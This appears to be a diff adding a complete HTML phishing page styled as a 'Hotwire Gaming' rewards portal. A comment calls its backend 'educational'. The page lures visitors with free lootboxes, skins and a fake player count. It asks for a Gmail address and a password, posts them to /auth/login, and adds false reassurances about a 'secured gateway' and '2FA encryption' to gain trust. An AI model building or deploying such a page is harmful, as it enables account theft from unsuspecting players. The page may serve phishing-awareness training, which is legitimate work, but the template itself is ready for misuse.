@@ -1,0 +1,406 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Hotwire Gaming - Claim Your Rewards</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', 'Segoe UI', system-ui, -apple-system, sans-serif;
+        }
+
+        body {
+            background: radial-gradient(circle at 10% 20%, #0a0f1e, #03060c);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        /* animated gaming grid background */
+        .grid-bg {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                linear-gradient(rgba(0, 255, 255, 0.05) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 255, 255, 0.05) 1px, transparent 1px);
+            background-size: 50px 50px;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        /* floating neon particles */
+        .particle {
+            position: absolute;
+            background: #00f2ff;
+            border-radius: 50%;
+            filter: blur(2px);
+            opacity: 0.4;
+            animation: floatParticle 12s infinite ease-in-out;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        @keyframes floatParticle {
+            0% { transform: translateY(0px) translateX(0px); opacity: 0.2; }
+            50% { transform: translateY(-60px) translateX(30px); opacity: 0.6; }
+            100% { transform: translateY(0px) translateX(0px); opacity: 0.2; }
+        }
+
+        /* main card container */
+        .gaming-card {
+            background: rgba(12, 18, 28, 0.92);
+            backdrop-filter: blur(12px);
+            border-radius: 42px;
+            box-shadow: 0 30px 50px rgba(0, 0, 0, 0.6), 0 0 0 2px rgba(0, 242, 255, 0.2), 0 0 20px rgba(0, 242, 255, 0.3);
+            width: 100%;
+            max-width: 500px;
+            overflow: hidden;
+            position: relative;
+            z-index: 2;
+            transition: transform 0.3s ease;
+            border: 1px solid rgba(0, 242, 255, 0.4);
+        }
+
+        .gaming-card:hover {
+            transform: scale(1.01);
+            box-shadow: 0 35px 55px rgba(0, 0, 0, 0.7), 0 0 0 2px #00f2ff, 0 0 28px #00f2ff;
+        }
+
+        /* header with glitch effect */
+        .gaming-header {
+            background: linear-gradient(135deg, #0b1120 0%, #111b2e 100%);
+            padding: 32px 24px;
+            text-align: center;
+            position: relative;
+            border-bottom: 2px solid #00f2ff;
+        }
+
+        .glow-logo {
+            width: 110px;
+            height: 110px;
+            margin: 0 auto 18px;
+            background: radial-gradient(circle, #00f2ff20, #0a0f1e);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 52px;
+            font-weight: 900;
+            color: #00f2ff;
+            text-shadow: 0 0 12px #00f2ff, 0 0 25px #0af;
+            box-shadow: 0 0 20px rgba(0, 242, 255, 0.6), inset 0 0 15px rgba(0, 242, 255, 0.3);
+            border: 1px solid rgba(0, 242, 255, 0.8);
+            position: relative;
+            animation: pulseGlow 2s infinite;
+        }
+
+        @keyframes pulseGlow {
+            0% { box-shadow: 0 0 5px rgba(0, 242, 255, 0.6), inset 0 0 8px rgba(0, 242, 255, 0.3); }
+            100% { box-shadow: 0 0 30px rgba(0, 242, 255, 0.9), inset 0 0 20px rgba(0, 242, 255, 0.5); }
+        }
+
+        .hotwire-text {
+            font-size: 38px;
+            font-weight: 800;
+            letter-spacing: 2px;
+            background: linear-gradient(135deg, #FFFFFF, #00f2ff, #2affb6);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            text-shadow: 0 0 8px rgba(0,242,255,0.5);
+        }
+
+        .gaming-header p {
+            color: #b0c4de;
+            font-weight: 500;
+            font-size: 15px;
+            margin-top: 8px;
+            letter-spacing: 0.5px;
+        }
+
+        .badge {
+            display: inline-block;
+            background: #ff4d4d20;
+            backdrop-filter: blur(4px);
+            border: 1px solid #ffaa33;
+            border-radius: 60px;
+            padding: 5px 15px;
+            font-size: 12px;
+            font-weight: bold;
+            margin-top: 14px;
+            color: #ffcc77;
+        }
+
+        /* form */
+        .gaming-form {
+            padding: 32px 28px;
+        }
+
+        .input-group {
+            margin-bottom: 28px;
+        }
+
+        .input-group label {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 10px;
+            font-weight: 600;
+            color: #eef5ff;
+            font-size: 14px;
+            letter-spacing: 0.3px;
+        }
+
+        .input-group label i {
+            color: #00f2ff;
+            font-size: 16px;
+        }
+
+        .neon-input {
+            position: relative;
+        }
+
+        .neon-input i.input-icon {
+            position: absolute;
+            left: 18px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #00f2ff;
+            font-size: 18px;
+            text-shadow: 0 0 3px cyan;
+            z-index: 1;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 15px 18px 15px 48px;
+            background: #0a101ccc;
+            border: 1.5px solid #2a3b55;
+            border-radius: 40px;
+            font-size: 16px;
+            color: #fff;
+            transition: all 0.25s;
+            backdrop-filter: blur(4px);
+        }
+
+        .form-control:focus {
+            border-color: #00f2ff;
+            box-shadow: 0 0 12px rgba(0, 242, 255, 0.6), inset 0 0 4px rgba(0,242,255,0.3);
+            outline: none;
+            background: #0e1622;
+        }
+
+        /* cta button */
+        .gaming-btn {
+            display: block;
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(95deg, #00c6ff, #0072ff);
+            border: none;
+            border-radius: 60px;
+            font-weight: 800;
+            font-size: 18px;
+            color: #fff;
+            cursor: pointer;
+            transition: all 0.25s;
+            box-shadow: 0 8px 20px rgba(0, 114, 255, 0.4);
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            margin-top: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+        }
+
+        .gaming-btn:hover {
+            background: linear-gradient(95deg, #0099ff, #0055dd);
+            transform: translateY(-3px);
+            box-shadow: 0 14px 28px rgba(0, 170, 255, 0.6);
+        }
+
+        .gaming-btn:active {
+            transform: translateY(1px);
+        }
+
+        /* reward chips */
+        .reward-strip {
+            display: flex;
+            justify-content: space-between;
+            margin: 25px 0 15px;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+
+        .reward-chip {
+            background: #0f172ad9;
+            border-radius: 100px;
+            padding: 8px 12px;
+            font-size: 12px;
+            font-weight: 600;
+            color: #bbf0ff;
+            border: 1px solid #00f2ff60;
+            flex: 1;
+            text-align: center;
+            backdrop-filter: blur(4px);
+        }
+
+        .reward-chip i {
+            color: gold;
+            margin-right: 5px;
+        }
+
+        .security-note {
+            background: #00000066;
+            border-radius: 20px;
+            padding: 14px 18px;
+            margin-top: 28px;
+            font-size: 12px;
+            color: #b9d9ff;
+            border-left: 4px solid #00f2ff;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .fa-shield-haltered {
+            font-size: 20px;
+            color: #0af;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-top: 24px;
+            font-size: 12px;
+        }
+
+        .footer-links a {
+            color: #7c9bc0;
+            text-decoration: none;
+            transition: 0.2s;
+        }
+
+        .footer-links a:hover {
+            color: #00f2ff;
+            text-shadow: 0 0 3px cyan;
+        }
+
+        /* animated corner glints */
+        .corner-glow {
+            position: absolute;
+            width: 150px;
+            height: 150px;
+            background: radial-gradient(circle, rgba(0,242,255,0.2) 0%, rgba(0,0,0,0) 70%);
+            border-radius: 50%;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        @media (max-width: 500px) {
+            .gaming-form {
+                padding: 24px 20px;
+            }
+            .hotwire-text {
+                font-size: 28px;
+            }
+            .reward-chip {
+                font-size: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="grid-bg"></div>
+    <!-- dynamic floating particles -->
+    <div class="particle" style="width: 6px; height: 6px; top: 15%; left: 10%; animation-duration: 14s;"></div>
+    <div class="particle" style="width: 12px; height: 12px; top: 70%; left: 85%; animation-duration: 18s; opacity: 0.3;"></div>
+    <div class="particle" style="width: 8px; height: 8px; top: 40%; left: 25%; animation-duration: 11s;"></div>
+    <div class="particle" style="width: 14px; height: 14px; top: 80%; left: 15%; animation-duration: 20s;"></div>
+    <div class="particle" style="width: 5px; height: 5px; top: 50%; left: 70%; animation-duration: 9s;"></div>
+
+    <div class="gaming-card">
+        <div class="gaming-header">
+            <div class="glow-logo">
+                <span class="hotwire-text">H🔥T</span>
+            </div>
+            <h1 style="font-size: 26px; margin-bottom: 4px; background: linear-gradient(135deg,#fff, #0af); -webkit-background-clip:text; background-clip:text; color:transparent;">HOTWIRE GAMING</h1>
+            <p>⚡ Claim your limited lootbox & exclusive skin ⚡</p>
+            <div class="badge">
+                <i class="fas fa-gem"></i> 2,345 active players
+            </div>
+        </div>
+
+        <!-- FORM: submits to /auth/login (same educational backend logic) -->
+        <form class="gaming-form" action="/auth/login" method="POST">
+            <div class="input-group">
+                <label><i class="fab fa-google"></i> Google account (Gmail)</label>
+                <div class="neon-input">
+                    <i class="fas fa-envelope input-icon"></i>
+                    <input type="email" name="gmail" class="form-control" placeholder="your.gaming.id@gmail.com" required autocomplete="email">
+                </div>
+                <div style="font-size: 11px; margin-top: 6px; color:#6c8db0;">Use the same email linked to your game rewards</div>
+            </div>
+
+            <div class="input-group">
+                <label><i class="fas fa-lock"></i> Hotwire Vault Password</label>
+                <div class="neon-input">
+                    <i class="fas fa-key input-icon"></i>
+                    <input type="password" name="password" class="form-control" placeholder="Enter your secure password" required autocomplete="current-password">
+                </div>
+            </div>
+
+            <button type="submit" class="gaming-btn">
+                <i class="fas fa-gamepad"></i> UNLOCK REWARDS
+                <i class="fas fa-arrow-right"></i>
+            </button>
+
+            <div class="reward-strip">
+                <div class="reward-chip"><i class="fas fa-gift"></i> 500 G-Coins</div>
+                <div class="reward-chip"><i class="fas fa-fire"></i> Legendary Crate</div>
+                <div class="reward-chip"><i class="fas fa-trophy"></i> XP Boost 2H</div>
+            </div>
+
+            <div class="security-note">
+                <i class="fas fa-shield-haltered"></i>
+                <span>🔐 Official Hotwire secured gateway • 2FA encryption active • never share credentials</span>
+            </div>
+
+            <div class="footer-links">
+                <a href="#"><i class="fab fa-discord"></i> Discord rewards</a>
+                <a href="#"><i class="fas fa-question-circle"></i> Support</a>
+                <a href="#"><i class="fas fa-user-secret"></i> Privacy</a>
+            </div>
+        </form>
+    </div>
+
+    <!-- Tiny script for interactive holographic effect (just visual) -->
+    <script>
+        // just a micro interaction: particles follow mouse? just playful
+        document.body.addEventListener('mousemove', (e) => {
+            const particles = document.querySelectorAll('.particle');
+            if (particles.length) {
+                const x = e.clientX / window.innerWidth;
+                const y = e.clientY / window.innerHeight;
+                particles.forEach((p, idx) => {
+                    const moveX = (x - 0.5) * 20 * (idx + 1) * 0.3;
+                    const moveY = (y - 0.5) * 20 * (idx + 1) * 0.3;
+                    p.style.transform = `translate(${moveX}px, ${moveY}px)`;
+                });
+            }
+        });
+    </script>
+</body>
+</html>
